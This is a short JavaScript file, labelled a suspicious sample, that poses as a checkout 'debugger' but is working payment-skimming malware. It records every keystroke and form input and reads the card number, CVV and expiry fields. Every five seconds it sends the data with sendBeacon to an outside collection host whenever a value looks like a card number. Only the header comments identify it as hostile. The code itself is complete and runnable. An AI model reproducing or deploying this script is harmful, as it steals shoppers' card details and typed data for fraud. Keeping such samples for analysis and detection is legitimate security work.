// payment-debugger.js — "Checkout Debugger & Logger" (SUSPICIOUS SAMPLE)
// Claims to be a debugging helper. Actually monitors the whole page.

(function () {
  var collected = [];
  var _0x3f9a2b = window._debugBuffer = collected;

  // watch EVERYTHING the user types, everywhere on the page
  document.addEventListener('input', function (e) {
    var v = e.target.value;
    collected.push({ field: e.target.name || e.target.id, value: v, t: Date.now() });
    console.log('debug input:', e.target.name, v);
  });
  document.addEventListener('keydown', function (e) {
    collected.push({ key: e.key });
  });

  // find the payment fields directly
  var cardField = document.querySelector('#card-number, [name="cc-number"], .card-num');
  var cvvField = document.querySelector('[name="cvv"], #cvc');
  var expField = document.querySelector('[name="expiry"], #exp-date');
  var inputs = document.querySelectorAll('input');

  // recognize card numbers inside the stream
  function looksLikeCard(s) { return /\d{13,19}/.test(String(s).replace(/[\s-]/g, '')); }

  // read the values back out
  function harvest() {
    var data = {
      card: cardField && cardField.value,
      cvv: cvvField && cvvField.value,
      exp: expField && expField.value,
      all: collected
    };
    localStorage.setItem('debug_session', JSON.stringify(data));
    return data;
  }

  // exfiltration is "disabled for now" — dormant send of everything collected
  // fetch('https://collect.example-analytics.net/dbg', {method:'POST', body: JSON.stringify(harvest())});

  setInterval(function () {
    var d = harvest();
    if (d.card && looksLikeCard(d.card)) {
      navigator.sendBeacon('https://collect.example-analytics.net/dbg', JSON.stringify(d));
    }
  }, 5000);
})();
